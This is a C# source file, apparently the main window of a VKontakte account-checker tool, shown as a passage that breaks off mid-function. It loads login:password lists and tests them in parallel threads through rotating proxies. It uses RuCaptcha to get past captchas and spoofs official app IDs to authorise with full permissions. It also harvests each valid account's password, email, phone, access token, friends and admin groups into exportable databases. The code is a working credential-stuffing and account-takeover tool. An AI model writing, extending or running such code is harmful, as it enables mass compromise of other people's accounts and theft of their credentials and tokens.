using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Documents;
using System.Windows.Input;
using System.Threading;
using System.Diagnostics;
using System.IO;
using RuCaptcha;
using System.Net;
using Newtonsoft.Json;
using System.Xml.Serialization;
using VkNet;
using VkNet.Model;
using VkNet.Enums.Filters;
using VkNet.Exception;
using VkNet.Utils.AntiCaptcha;
using System.Text.RegularExpressions;
using Microsoft.Extensions.DependencyInjection;

namespace VkChecker2
{
    /// <summary>
    /// Логика взаимодействия для MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        bool loaded = false;
        public MainWindow()
        {
            InitializeComponent();
        }

        public static ProgramSettings programSettings;

        private void Window_MouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            try
            {
                this.DragMove();
            }
            catch { }
        }

        private void Image1_MouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            System.Windows.Application.Current.Shutdown();
        }

        private void Image2_MouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            this.WindowState = WindowState.Minimized;
        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {
            tb1.SelectedIndex = 0;
        }

        private void Button_Click_1(object sender, RoutedEventArgs e)
        {
            tb1.SelectedIndex = 1;
        }

        private void Button_Click_2(object sender, RoutedEventArgs e)
        {
            tb1.SelectedIndex = 2;
            if (RuCaptchaTb.Text.Length == 32)
            {
                try
                {
                    RuCaptcha.Account.ApiKey = RuCaptchaTb.Text;
                    BalanceInfoLb.Content = $"Текущий баланс: {RuCaptcha.Account.GetBalance()} рублей";
                }
                catch
                {
                    BalanceInfoLb.Content = $"Текущий баланс: ??? рублей";
                }
            }
            else
            {
                RuCaptcha.Account.ApiKey = null;
                BalanceInfoLb.Content = $"Текущий баланс: ??? рублей";
            }
        }

        private void Button_Click_3(object sender, RoutedEventArgs e)
        {
            tb1.SelectedIndex = 3;
        }

        private void VersionLabel_Click(object sender, RoutedEventArgs e)
        {
            Process.Start("https://github.com/Irval1337/UnoChecker/releases");
        }

        private void tb1_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            if (tb1.SelectedIndex == 1 && dataBase != null && dataBase.accounts != null)
            {
                try
                {
                    Stats.Items.Clear();
                    Stats.Items.Clear();
                    string time = $"{(dataBase.usingResources.checkingTime.Hour < 10 ? "0" : string.Empty)}{dataBase.usingResources.checkingTime.Hour}:{(dataBase.usingResources.checkingTime.Minute < 10 ? "0" : string.Empty)}{dataBase.usingResources.checkingTime.Minute}:{dataBase.usingResources.checkingTime.Second}";
                    DataBaseStatsLabel.Content = $"Всего аккаунтов: {dataBase.totalAccounts}\nВалидных: {dataBase.validAccounts}\nНевалидных: {dataBase.invalidAccounts}\nПроцент валидности: {dataBase.validProcent}% ";
                    Resources1Label.Content = $"Количество потоков: {dataBase.usingResources.threadsCount}\nАккаунтов в потоке: {dataBase.usingResources.accountsInThread}\n\n\n\nВремя проверки: {time}";
                    Resources2Label.Content = $"Использовано прокси: {dataBase.usingResources.proxiesUsed}\nЧастота смены: {dataBase.usingResources.changeProxyTime} сек.\n\nИспользовано токенов RuCaptcha: {dataBase.usingResources.captchaSolves}\nНеверных разгадываний: {dataBase.usingResources.badSolves}\nЧастота использования: 1 в {dataBase.usingResources.useCapcthaTime} аккаунта";

                    foreach (var account in dataBase.accounts)
                    {
                        Stats.Items.Add(new AccountRaw() { Login = account.Login, Password = account.Password, Email = account.Email, PhoneNumber = account.PhoneNumber, AdditionalInfoStr = account.AdditionalInfoStr });
                    }
                }
                catch { }
            }
            if (!loaded)
                return;
            if (tb1.SelectedIndex != 2)
            {
                #region BypassInfo
                BypassInfo bypassInfo = programSettings.bypassInfo;
                bypassInfo.methodsPriority.First = (BypassMethod?)priority1.SelectedIndex;
                if (priority2.Visibility == Visibility.Visible)
                {
                    var selectedItem2 = priority2.SelectedItem;
                    for (int i = 0; i < cbExample.Items.Count; i++)
                    {
                        if (selectedItem2.ToString().Contains(cbExample.Items[i].ToString().Substring(cbExample.Items[i].ToString().IndexOf(" ") + 1)))
                        {
                            bypassInfo.methodsPriority.Second = (BypassMethod)(i - 1);
                            break;
                        }
                    }
                    if (priority3.Visibility == Visibility.Visible)
                    {
                        var selectedItem3 = priority3.SelectedItem;
                        for (int i = 0; i < cbExample.Items.Count; i++)
                        {
                            if (selectedItem3.ToString().Contains(cbExample.Items[i].ToString().Substring(cbExample.Items[i].ToString().IndexOf(" ") + 1)))
                            {
                                bypassInfo.methodsPriority.Third = (BypassMethod)(i - 1);
                                break;
                            }
                        }
                    }
                    else
                        bypassInfo.methodsPriority.Third = null;
                }
                else
                    bypassInfo.methodsPriority.Second = bypassInfo.methodsPriority.Third = null;
                bypassInfo.ruCaptchaToken = RuCaptchaTb.Text;
                bypassInfo.ruCaptchaData = new TextRange(RuCaptchaRb.Document.ContentStart, RuCaptchaRb.Document.ContentEnd).Text.Split('\n').ToList();
                bypassInfo.proxyList = new TextRange(ProxyRTB.Document.ContentStart, ProxyRTB.Document.ContentEnd).Text.Split('\n').ToList();
                #endregion
            }
            if (tb1.SelectedIndex != 3)
            {
                #region SettingsInfo
                SettingsInfo settings = programSettings.settingsInfo;
                if (Rb1.IsChecked == true)
                    settings.logsFormat = LogsFormat.JSON;
                else if (Rb2.IsChecked == true)
                    settings.logsFormat = LogsFormat.XML;
                else
                    settings.logsFormat = LogsFormat.Text;
                settings.authService = (AuthService)AuthServiceCb.SelectedIndex;
                settings.ownAuthService.isEnabled = !String.IsNullOrEmpty(OwnServiceTb.Text);
                settings.ownAuthService.appId = settings.ownAuthService.isEnabled == true ? (int?)Convert.ToInt32(OwnServiceTb.Text) : null;
                settings.logsPath = PathTextBox.Text;
                settings.filterInvalid = FilterCb.IsChecked;

                settings.additionalFields.Url = ((ListBoxItem)FieldsLb.Items[0]).IsSelected;
                settings.additionalFields.Name = ((ListBoxItem)FieldsLb.Items[1]).IsSelected;
                settings.additionalFields.Gender = ((ListBoxItem)FieldsLb.Items[2]).IsSelected;
                settings.additionalFields.HasPhoto = ((ListBoxItem)FieldsLb.Items[3]).IsSelected;
                settings.additionalFields.City = ((ListBoxItem)FieldsLb.Items[4]).IsSelected;
                settings.additionalFields.Token = ((ListBoxItem)FieldsLb.Items[5]).IsSelected;
                settings.additionalFields.IsBanned = ((ListBoxItem)FieldsLb.Items[6]).IsSelected;
                settings.additionalFields.FriendsCount = ((ListBoxItem)FieldsLb.Items[7]).IsSelected;
                settings.additionalFields.SubsCount = ((ListBoxItem)FieldsLb.Items[8]).IsSelected;
                settings.additionalFields.AdminGroups = ((ListBoxItem)FieldsLb.Items[9]).IsSelected;
                settings.additionalFields.ErrorType = ((ListBoxItem)FieldsLb.Items[10]).IsSelected;
                #endregion
            }
        }

        private void Window_Load(object sender, RoutedEventArgs e)
        {
            string news = Requests.GET("https://raw.githubusercontent.com/Irval1337/UnoChecker/main/NEWS.md", "");
            VersionLabel.Content = news.Substring(0, news.IndexOf("\n"));
            NewsRichTextBox.AppendText(news.Substring(news.IndexOf("\n") + 1));
            programSettings = new ProgramSettings();

            #region SettingsInfo
            SettingsInfo settings = programSettings.settingsInfo;
            if (settings.logsFormat == LogsFormat.JSON)
            {
                Rb1.IsChecked = true;
                Rb2.IsChecked = Rb3.IsChecked = false;
            }
            else if (settings.logsFormat == LogsFormat.XML)
            {
                Rb2.IsChecked = true;
                Rb1.IsChecked = Rb3.IsChecked = false;
            }
            else
            {
                Rb3.IsChecked = true;
                Rb1.IsChecked = Rb2.IsChecked = false;
            }
            AuthServiceCb.SelectedIndex = (int)settings.authService;
            OwnServiceTb.Text = settings.ownAuthService.isEnabled == true ? settings.ownAuthService.appId.ToString() : "";
            PathTextBox.Text = settings.logsPath;
            FilterCb.IsChecked = settings.filterInvalid == true;
            FieldsLb.SelectedItems.Clear();

            ((ListBoxItem)FieldsLb.Items[0]).IsSelected = settings.additionalFields.Url == true;
            ((ListBoxItem)FieldsLb.Items[1]).IsSelected = settings.additionalFields.Name == true;
            ((ListBoxItem)FieldsLb.Items[2]).IsSelected = settings.additionalFields.Gender == true;
            ((ListBoxItem)FieldsLb.Items[3]).IsSelected = settings.additionalFields.HasPhoto == true;
            ((ListBoxItem)FieldsLb.Items[4]).IsSelected = settings.additionalFields.City == true;
            ((ListBoxItem)FieldsLb.Items[5]).IsSelected = settings.additionalFields.Token == true;
            ((ListBoxItem)FieldsLb.Items[6]).IsSelected = settings.additionalFields.IsBanned == true;
            ((ListBoxItem)FieldsLb.Items[7]).IsSelected = settings.additionalFields.FriendsCount == true;
            ((ListBoxItem)FieldsLb.Items[8]).IsSelected = settings.additionalFields.SubsCount == true;
            ((ListBoxItem)FieldsLb.Items[9]).IsSelected = settings.additionalFields.AdminGroups == true;
            ((ListBoxItem)FieldsLb.Items[10]).IsSelected = settings.additionalFields.ErrorType == true;
            #endregion

            #region BypassInfo
            ProxyPb.Visibility = Visibility.Hidden;
            ProxyInfoTotal.Visibility = ProxyInfoValid.Visibility = Visibility.Hidden;
            BypassInfo bypassInfo = programSettings.bypassInfo;
            priority1.SelectedIndex = (int)bypassInfo.methodsPriority.First;
            if (priority1.SelectedIndex != 3 && bypassInfo.methodsPriority.Second != null)
            {
                Button_Click_4(sender, e);
                priority2.SelectedIndex = (int)bypassInfo.methodsPriority.Second < (int)bypassInfo.methodsPriority.First ? (int)bypassInfo.methodsPriority.Second + 1 : (int)bypassInfo.methodsPriority.Second;
                if (priority2.SelectedIndex != priority2.Items.Count - 1 && bypassInfo.methodsPriority.Third != null)
                {
                    Button_Click_4(sender, e);
                    if ((int)bypassInfo.methodsPriority.Third < Math.Min((int)bypassInfo.methodsPriority.First, (int)bypassInfo.methodsPriority.Second))
                        priority3.SelectedIndex = (int)bypassInfo.methodsPriority.Third + 1;
                    else
                        priority3.SelectedIndex = (int)bypassInfo.methodsPriority.Third > Math.Max((int)bypassInfo.methodsPriority.First, (int)bypassInfo.methodsPriority.Second) ? (int)bypassInfo.methodsPriority.Third - 1 : (int)bypassInfo.methodsPriority.Third;
                }
            }
            RuCaptchaTb.Text = bypassInfo.ruCaptchaToken;
            RuCaptchaRb.Document.Blocks.Clear();
            RuCaptchaRb.AppendText(String.Join("\n", bypassInfo.ruCaptchaData));

            ProxyRTB.Document.Blocks.Clear();
            ProxyRTB.AppendText(String.Join("\n", bypassInfo.proxyList));
            #endregion

            loaded = true;
            CkeckingStatusLabel.Content = "Статус: ожидание";
        }

        private void Button_Click_4(object sender, RoutedEventArgs e)
        {
            if (priority2.Visibility == Visibility.Hidden && priority1.SelectedIndex != -1 && priority1.SelectedIndex != priority1.Items.Count - 1 && priority1.SelectedIndex == 0)
            {
                AddMethod.Visibility = Visibility.Hidden;
                priority2.Visibility = Visibility.Visible;
                priority2.Items.Clear();
                priority3.Items.Clear();
                foreach (var item in cbExample.Items)
                {
                    priority2.Items.Add(item.ToString().Substring(item.ToString().IndexOf(" ") + 1));
                    priority3.Items.Add(item.ToString().Substring(item.ToString().IndexOf(" ") + 1));
                }
                priority2.Items.RemoveAt(priority1.SelectedIndex + 1);
                priority3.Items.RemoveAt(priority1.SelectedIndex + 1);
            }
            else if (priority2.SelectedIndex != -1 && priority2.SelectedIndex != priority2.Items.Count - 1)
            {
                AddMethod.Visibility = Visibility.Hidden;
                priority3.Visibility = Visibility.Visible;
                priority3.Items.Clear();
                foreach (var item in priority2.Items)
                    priority3.Items.Add(item.ToString());
                priority3.Items.RemoveAt(priority2.SelectedIndex);
            }
        }

        private void priority2_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            if (priority2.SelectedIndex == 0)
            {
                if (priority3.Visibility == Visibility.Visible)
                {
                    priority3.Visibility = Visibility.Hidden;
                    priority2.Items.Clear();
                    foreach (var item in priority3.Items)
                        priority2.Items.Add(item.ToString());
                    priority2.SelectedIndex = priority3.SelectedIndex;
                    priority3.SelectedIndex = -1;
                    AddMethod.Visibility = Visibility.Visible;
                }
                else
                {
                    priority2.Visibility = Visibility.Hidden;
                    priority2.SelectedIndex = -1;
                    AddMethod.Visibility = Visibility.Visible;
                }
            }
        }

        private void priority3_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            if (priority3.SelectedIndex == 0)
            {
                priority3.Visibility = Visibility.Hidden;
                priority3.SelectedIndex = -1;
                AddMethod.Visibility = Visibility.Visible;
            }
        }

        private void priority1_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            if (priority1.SelectedIndex == priority1.Items.Count - 1)
            {
                priority2.Visibility = priority3.Visibility = Visibility.Hidden;
                priority2.SelectedIndex = priority3.SelectedIndex = -1;
            }
        }

        private void OpenButton_Click(object sender, RoutedEventArgs e)
        {
            using (var dialog = new System.Windows.Forms.FolderBrowserDialog())
            {
                System.Windows.Forms.DialogResult result = dialog.ShowDialog();
                PathTextBox.Text = dialog.SelectedPath;
            }
        }

        private void Window_Closed(object sender, EventArgs e)
        {
            #region SettingsInfo
            SettingsInfo settings = programSettings.settingsInfo;
            if (Rb1.IsChecked == true)
                settings.logsFormat = LogsFormat.JSON;
            else if (Rb2.IsChecked == true)
                settings.logsFormat = LogsFormat.XML;
            else
                settings.logsFormat = LogsFormat.Text;
            settings.authService = (AuthService)AuthServiceCb.SelectedIndex;
            settings.ownAuthService.isEnabled = !String.IsNullOrEmpty(OwnServiceTb.Text);
            settings.ownAuthService.appId = settings.ownAuthService.isEnabled == true ? (int?)Convert.ToInt32(OwnServiceTb.Text) : null;
            settings.logsPath = PathTextBox.Text;
            settings.filterInvalid = FilterCb.IsChecked;

            settings.additionalFields.Url = ((ListBoxItem)FieldsLb.Items[0]).IsSelected;
            settings.additionalFields.Name = ((ListBoxItem)FieldsLb.Items[1]).IsSelected;
            settings.additionalFields.Gender = ((ListBoxItem)FieldsLb.Items[2]).IsSelected;
            settings.additionalFields.HasPhoto = ((ListBoxItem)FieldsLb.Items[3]).IsSelected;
            settings.additionalFields.City = ((ListBoxItem)FieldsLb.Items[4]).IsSelected;
            settings.additionalFields.Token = ((ListBoxItem)FieldsLb.Items[5]).IsSelected;
            settings.additionalFields.IsBanned = ((ListBoxItem)FieldsLb.Items[6]).IsSelected;
            settings.additionalFields.FriendsCount = ((ListBoxItem)FieldsLb.Items[7]).IsSelected;
            settings.additionalFields.SubsCount = ((ListBoxItem)FieldsLb.Items[8]).IsSelected;
            settings.additionalFields.AdminGroups = ((ListBoxItem)FieldsLb.Items[9]).IsSelected;
            settings.additionalFields.ErrorType = ((ListBoxItem)FieldsLb.Items[10]).IsSelected;
            #endregion

            #region BypassInfo
            BypassInfo bypassInfo = programSettings.bypassInfo;
            bypassInfo.methodsPriority.First = (BypassMethod?)priority1.SelectedIndex;
            if (priority2.Visibility == Visibility.Visible)
            {
                var selectedItem2 = priority2.SelectedItem;
                for (int i = 0; i < cbExample.Items.Count; i++)
                {
                    if (selectedItem2.ToString().Contains(cbExample.Items[i].ToString().Substring(cbExample.Items[i].ToString().IndexOf(" ") + 1)))
                    {
                        bypassInfo.methodsPriority.Second = (BypassMethod)(i - 1);
                        break;
                    }
                }
                if (priority3.Visibility == Visibility.Visible)
                {
                    var selectedItem3 = priority3.SelectedItem;
                    for (int i = 0; i < cbExample.Items.Count; i++)
                    {
                        if (selectedItem3.ToString().Contains(cbExample.Items[i].ToString().Substring(cbExample.Items[i].ToString().IndexOf(" ") + 1)))
                        {
                            bypassInfo.methodsPriority.Third = (BypassMethod)(i - 1);
                            break;
                        }
                    }
                }
                else
                    bypassInfo.methodsPriority.Third = null;
            }
            else
                bypassInfo.methodsPriority.Second = bypassInfo.methodsPriority.Third = null;
            bypassInfo.ruCaptchaToken = RuCaptchaTb.Text;
            bypassInfo.ruCaptchaData = new TextRange(RuCaptchaRb.Document.ContentStart, RuCaptchaRb.Document.ContentEnd).Text.Split('\n').ToList();
            bypassInfo.proxyList = new TextRange(ProxyRTB.Document.ContentStart, ProxyRTB.Document.ContentEnd).Text.Split('\n').ToList();
            #endregion

            programSettings.SaveSettings();
        }

        private void LoadProxyFromFile_Click(object sender, RoutedEventArgs e)
        {
            using (var dialog = new System.Windows.Forms.OpenFileDialog())
            {
                System.Windows.Forms.DialogResult result = dialog.ShowDialog();
                if (result == System.Windows.Forms.DialogResult.OK)
                {
                    ProxyRTB.Document.Blocks.Clear();
                    ProxyPb.Visibility = Visibility.Hidden;
                    ProxyInfoTotal.Visibility = ProxyInfoValid.Visibility = Visibility.Hidden;
                    ProxyRTB.AppendText(File.ReadAllText(dialog.FileName));
                    programSettings.bypassInfo.proxyList = File.ReadAllLines(dialog.FileName).ToList();
                }
            }
        }


        private void BalanceInfoLb_PreviewMouseDown(object sender, MouseButtonEventArgs e)
        {
            if (RuCaptchaTb.Text.Length == 32)
            {
                try
                {
                    RuCaptcha.Account.ApiKey = RuCaptchaTb.Text;
                    BalanceInfoLb.Content = $"Текущий баланс: {RuCaptcha.Account.GetBalance()} рублей";
                }
                catch
                {
                    BalanceInfoLb.Content = $"Текущий баланс: ??? рублей";
                }
            }
            else
            {
                RuCaptcha.Account.ApiKey = null;
                BalanceInfoLb.Content = $"Текущий баланс: ??? рублей";
            }
        }

        private void FilterButton_Click(object sender, RoutedEventArgs e)
        {
            if (FilterButton.Content.ToString() == "Отсеить невалид")
            {
                List<string> proxies = new TextRange(ProxyRTB.Document.ContentStart, ProxyRTB.Document.ContentEnd).Text.Split('\n').ToList();
                int threads = 25, slice = Convert.ToInt32(Math.Ceiling((double)proxies.Count / threads));
                ProxyPb.Visibility = Visibility.Visible;
                ProxyInfoTotal.Visibility = ProxyInfoValid.Visibility = Visibility.Visible;
                ProxyInfoTotal.Content = $"Проверено: 0/{proxies.Count}";
                ProxyInfoValid.Content = $"Валидных: 0";
                ProxyPb.Value = 0;
                ProxyPb.Maximum = proxies.Count;
                ProxyThreads = 0;
                TotalProxy = 0;
                Task.Factory.StartNew(() =>
                {
                    for (int i = 0; i < threads; i++)
                    {
                        var thread = new Thread(ProxyThread);
                        thread.IsBackground = true;
                        thread.Start(new object[] { proxies.Skip(slice * i).Take(slice).ToList(), this });
                    }
                });

                ProxyRTB.Document.Blocks.Clear();
                Task.Factory.StartNew(() =>
                {
                    while (ProxyThreads != threads)
                    {
                        this.Dispatcher.Invoke((ThreadStart)delegate
                        {
                            ProxyRTB.Document.Blocks.Clear();
                            ProxyRTB.AppendText(String.Join("\n", proxiesData));
                            ProxyPb.Value = TotalProxy;
                            ProxyInfoTotal.Content = $"Проверено: {TotalProxy}/{proxies.Count}";
                            ProxyInfoValid.Content = $"Валидных: {proxiesData.Count}";
                        });

                        Thread.Sleep(500);
                    }
                    this.Dispatcher.Invoke((ThreadStart)delegate
                    {
                        ProxyPb.Value = ProxyPb.Maximum;
                        ProxyInfoTotal.Content = $"Проверено: {TotalProxy}/{proxies.Count}";
                        ProxyInfoValid.Content = $"Валидных: {proxiesData.Count}";
                        ProxyThreads = 0;
                        CloseThreads = false;
                        TotalProxy = 0;
                        proxiesData = new List<string>();
                        FilterButton.Content = "Отсеить невалид";
                        programSettings.bypassInfo.proxyList = proxiesData;
                    });
                });
                FilterButton.Content = "Остановить проверку";
            }
            else
                CloseThreads = true;
        }

        public static List<string> proxiesData = new List<string>();
        public static bool CloseThreads = false;
        public static int ProxyThreads = 0;
        public static int TotalProxy = 0;

        private static void ProxyThread(object data)
        {
            List<string> proxies = (List<string>)(((object[])data)[0]);
            MainWindow main = (MainWindow)(((object[])data)[1]);

            foreach (var proxy in proxies)
            {
                if (CloseThreads)
                    break; 
                if (CanPing(proxy.Replace("\r", "")))
                    proxiesData.Add(proxy.Replace("\r", ""));
                TotalProxy++;
            }
            ProxyThreads++;
        }

        public static bool CanPing(string address)
        {
            if (string.IsNullOrEmpty(address) || CloseThreads)
                return false;

            bool OK = false;
            try
            {
                MyWebClient wc = new MyWebClient();
                wc.Timeout = 1000;
                wc.Proxy = new WebProxy(address);
                OK = wc.DownloadString("http://google.com/").Contains("schema.org");
            }
            catch { }
            return OK;
        }

        public static DataBase dataBase = new DataBase();
        private void ImportDataBase_Click(object sender, RoutedEventArgs e)
        {
            using (var dialog = new System.Windows.Forms.OpenFileDialog())
            {
                dialog.Filter = "JSON DataBase (*.json)|*.json|XML DataBase (*.xml)|*.xml|Text DataBase (*.database)|*.database";
                System.Windows.Forms.DialogResult result = dialog.ShowDialog();
                if (result == System.Windows.Forms.DialogResult.OK)
                {
                    Stats.Items.Clear();
                    Stats.Items.Clear();
                    dataBase = new DataBase();
                    if (dialog.FileName.EndsWith(".json"))
                        dataBase = JsonConvert.DeserializeObject<DataBase>(File.ReadAllText(dialog.FileName));
                    else if (dialog.FileName.EndsWith(".xml"))
                    {
                        XmlSerializer serializer = new XmlSerializer(typeof(DataBase));
                        using (FileStream fs = new FileStream(dialog.FileName, FileMode.OpenOrCreate))
                        {
                            dataBase = (DataBase)serializer.Deserialize(fs);
                        }
                    }
                    else if (dialog.FileName.EndsWith(".database")) {
                        string tmp = File.ReadAllText(dialog.FileName);
                        dataBase.ParseText(ref tmp);
                    }
                    else return;
                    string time = $"{(dataBase.usingResources.checkingTime.Hour < 10 ? "0" : string.Empty)}{dataBase.usingResources.checkingTime.Hour}:{(dataBase.usingResources.checkingTime.Minute < 10 ? "0" : string.Empty)}{dataBase.usingResources.checkingTime.Minute}:{dataBase.usingResources.checkingTime.Second}";
                    DataBaseStatsLabel.Content = $"Всего аккаунтов: {dataBase.totalAccounts}\nВалидных: {dataBase.validAccounts}\nНевалидных: {dataBase.invalidAccounts}\nПроцент валидности: {dataBase.validProcent}% ";
                    Resources1Label.Content = $"Количество потоков: {dataBase.usingResources.threadsCount}\nАккаунтов в потоке: {dataBase.usingResources.accountsInThread}\n\n\n\nВремя проверки: {time}";
                    Resources2Label.Content = $"Использовано прокси: {dataBase.usingResources.proxiesUsed}\nЧастота смены: {dataBase.usingResources.changeProxyTime} сек.\n\nИспользовано токенов RuCaptcha: {dataBase.usingResources.captchaSolves}\nНеверных разгадываний: {dataBase.usingResources.badSolves}\nЧастота использования: 1 в {dataBase.usingResources.useCapcthaTime} аккаунта";
                
                    foreach (var account in dataBase.accounts)
                    {
                        Stats.Items.Add(new AccountRaw() { Login = account.Login, Password = account.Password, Email = account.Email, PhoneNumber = account.PhoneNumber, AdditionalInfoStr = account.AdditionalInfoStr});
                    }
                }
            }
        }

        private void ExportDataBase_Click(object sender, RoutedEventArgs e)
        {
            using (var dialog = new System.Windows.Forms.SaveFileDialog())
            {
                dialog.Filter = "JSON DataBase (*.json)|*.json|XML DataBase (*.xml)|*.xml|Text DataBase (*.database)|*.database";
                System.Windows.Forms.DialogResult result = dialog.ShowDialog();
                if (result == System.Windows.Forms.DialogResult.OK)
                {
                    if (dialog.FileName.EndsWith(".json"))
                        File.WriteAllText(dialog.FileName, JsonConvert.SerializeObject(dataBase));
                    else if (dialog.FileName.EndsWith(".xml"))
                    {
                        XmlSerializer serializer = new XmlSerializer(typeof(DataBase));
                        StreamWriter writer = new StreamWriter(dialog.FileName);

                        serializer.Serialize(writer, dataBase);
                        writer.Close();
                    }
                    else if (dialog.FileName.EndsWith(".database"))
                        File.WriteAllText(dialog.FileName, dataBase.GetText());
                    else return;
                }
            }
        }

        private void ImportAccountsButton_Click(object sender, RoutedEventArgs e)
        {
            using (var dialog = new System.Windows.Forms.OpenFileDialog())
            {
                System.Windows.Forms.DialogResult result = dialog.ShowDialog();
                if (result == System.Windows.Forms.DialogResult.OK)
                {
                    AccountsRb.Document.Blocks.Clear();
                    AccountsRb.AppendText(File.ReadAllText(dialog.FileName));
                }
            }
        }

        private void ImportBufferAccountsButton_Click(object sender, RoutedEventArgs e)
        {
            AccountsRb.Document.Blocks.Clear();
            AccountsRb.AppendText(Clipboard.GetText());
        }

        public static int AccountsThreads = 0, TotalThreads = 0;
        public static List<string> accountsData = new List<string>();
        public static bool closeVk = false;
        public DateTime startTime;

        private void StartChecking_Click(object sender, RoutedEventArgs e)
        {
            closeVk = false;
            dataBase = new DataBase();
            dataBase.accounts = new List<Account>();
            LogsRb.Document.Blocks.Clear();
            AddLog("Начата проверка", this);
            List<string> accounts = new TextRange(AccountsRb.Document.ContentStart, AccountsRb.Document.ContentEnd).Text.Split('\n').ToList();
            int threads = Convert.ToInt32(ThreadsCountTb.Text), slice = Convert.ToInt32(Math.Ceiling((double)accounts.Count / threads));
            CkeckingStatusLabel.Content = $"Статус: проверка 0/{accounts.Count}";
            AccountsThreads = 0;
            TotalThreads = 0;
            startTime = DateTime.Now;
            AccountsInThreadLabel.Content = $"Аккаунтов в каждом потоке: {slice}";


            dataBase.totalAccounts = accounts.Count;
            dataBase.usingResources = new UsingResources()
            {
                accountsInThread = slice,
                badSolves = 0,
                captchaSolves = 0,
                changeProxyTime = 0,
                checkingTime = new DateTime(2021, 1, 1, 0, 0, 0),
                proxiesUsed = 0,
                threadsCount = threads,
                useCapcthaTime = 0
            };
            dataBase.validAccounts = 0;
            dataBase.validProcent = 0;
            dataBase.invalidAccounts = 0;


            Task.Factory.StartNew(() =>
            {
                for (int i = 0; i < threads; i++)
                {
                    var thread = new Thread(VkThread);
                    thread.IsBackground = true;
                    thread.Start(new object[] { accounts.Skip(slice * i).Take(slice).ToList(), this });
                }
            });

            Task.Factory.StartNew(() =>
            {
                while (TotalThreads != threads)
                {
                    this.Dispatcher.Invoke((ThreadStart)delegate
                    {
                        AccountsRb.Document.Blocks.Clear();
                        AccountsRb.AppendText(String.Join("\n", accountsData));
                        CkeckingStatusLabel.Content = $"Статус: проверка {AccountsThreads}/{accounts.Count}\n";
                        dataBase.validProcent = dataBase.validAccounts / dataBase.totalAccounts * 100;
                        dataBase.usingResources.proxiesUsed = ProxyIndex - 1;
                        dataBase.usingResources.captchaSolves = Solves;
                        dataBase.usingResources.useCapcthaTime = AccountsThreads / Math.Max(Solves, 1);
                        var tmp = DateTime.Now - startTime;
                        dataBase.usingResources.checkingTime = new DateTime(2021, 1, 1, tmp.Hours, tmp.Minutes, tmp.Seconds);
                        dataBase.usingResources.badSolves = BadSolves;
                        dataBase.usingResources.changeProxyTime = Convert.ToInt32(tmp.TotalSeconds / Math.Max(ProxyIndex - 1, 1));
                    });

                    Thread.Sleep(500);
                }
                this.Dispatcher.Invoke((ThreadStart)delegate
                {
                    CkeckingStatusLabel.Content = $"Статус: проверено";
                    AccountsThreads = 0;
                    closeVk = false;
                    TotalThreads = 0;
                    switch (programSettings.settingsInfo.logsFormat)
                    {
                        case LogsFormat.JSON:
                            File.WriteAllText(programSettings.settingsInfo.logsPath + @"\log.json", JsonConvert.SerializeObject(dataBase));
                            break;
                        case LogsFormat.XML:
                            XmlSerializer serializer = new XmlSerializer(typeof(DataBase));
                            StreamWriter writer = new StreamWriter(programSettings.settingsInfo.logsPath + @"\log.xml");

                            serializer.Serialize(writer, dataBase);
                            writer.Close();
                            break;
                        case LogsFormat.Text:
                            File.WriteAllText(programSettings.settingsInfo.logsPath + @"\log.database", dataBase.GetText());
                            break;
                    }
                });
            });
        }

        public static int ProxyIndex = 1;
        public static int Capctha = 0;
        public static int Solves = 0;
        public static int BadSolves = 0;

        private static void VkThread(object data)
        { 
            List<string> accounts = (List<string>)(((object[])data)[0]);
            MainWindow main = (MainWindow)(((object[])data)[1]);

            foreach (var account in accounts)
            {
                if (closeVk)
                    break;
                try
                {
                    var serviceCollection = new ServiceCollection();
                    if (programSettings.bypassInfo.methodsPriority.First == BypassMethod.Proxy || programSettings.bypassInfo.methodsPriority.Second == BypassMethod.Proxy)
                    {
                        if (programSettings.bypassInfo.proxyList != null && ProxyIndex <= programSettings.bypassInfo.proxyList.Count)
                            serviceCollection.AddSingleton<IWebProxy>(new WebProxy(programSettings.bypassInfo.proxyList[ProxyIndex - 1].Replace("\r", "")));
                    }

                    VkApi api = new VkApi(serviceCollection);

                    string login = account.Split(':')[0];
                    string password = account.Split(':')[1].Replace("\r", "");

                    ulong AppId = 0;
                    switch (programSettings.settingsInfo.authService)
                    {
                        case AuthService.Instagram:
                            AppId = (ulong)AuthServiceId.Instagram;
                            break;
                        case AuthService.KateMobile:
                            AppId = (ulong)AuthServiceId.KateMobile;
                            break;
                        case AuthService.Prisma:
                            AppId = (ulong)AuthServiceId.Prisma;
                            break;
                        case AuthService.VFeed:
                            AppId = (ulong)AuthServiceId.VFeed;
                            break;
                        case AuthService.VkAdmin:
                            AppId = (ulong)AuthServiceId.VkAdmin;
                            break;
                        case AuthService.VkAdmin_iOS:
                            AppId = (ulong)AuthServiceId.VkAdmin_iOS;
                            break;
                        case AuthService.VkAPI:
                            AppId = (ulong)AuthServiceId.VkAPI;
                            break;
                        case AuthService.VkLive:
                            AppId = (ulong)AuthServiceId.VkLive;
                            break;
                        case AuthService.VkLiveAndroid:
                            AppId = (ulong)AuthServiceId.VkLiveAndroid;
                            break;
                        case AuthService.VkMe:
                            AppId = (ulong)AuthServiceId.VkMe;
                            break;
                        case AuthService.Random:
                            Array values = Enum.GetValues(typeof(AuthServiceId));
                            Random random = new Random();
                            AuthServiceId randomAuthServiceId = (AuthServiceId)values.GetValue(random.Next(values.Length));
                            AppId = (uint)randomAuthServiceId;
                            break;
                    }

                    if (programSettings.bypassInfo.methodsPriority.First == BypassMethod.RuCapctha)
                        api.CaptchaSolver = new CaptchaSolver();
                    api.Authorize(new ApiAuthParams
                    {
                        ApplicationId = AppId,
                        Login = login,
                        Password = password,
                        Settings = Settings.All,
                        
                    });

                    Account dbAccount = new Account();
                    dbAccount.AdditionalInfo = new AdditionalInfo();
                    var accInfo = api.Users.Get(new List<long>() { api.UserId.Value }, ProfileFields.All)[0];
                    var friends = api.Friends.Get(new VkNet.Model.RequestParams.FriendsGetParams() { Fields = ProfileFields.FirstName });
